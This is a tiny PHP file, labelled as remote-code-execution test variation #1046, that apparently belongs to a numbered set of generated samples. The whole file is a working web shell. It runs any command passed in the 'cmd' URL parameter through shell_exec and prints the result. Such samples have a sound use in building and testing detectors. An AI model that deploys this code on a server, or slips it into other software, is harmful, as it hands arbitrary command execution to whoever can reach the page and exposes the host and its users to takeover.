<?php
// RCE test variation #1046
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>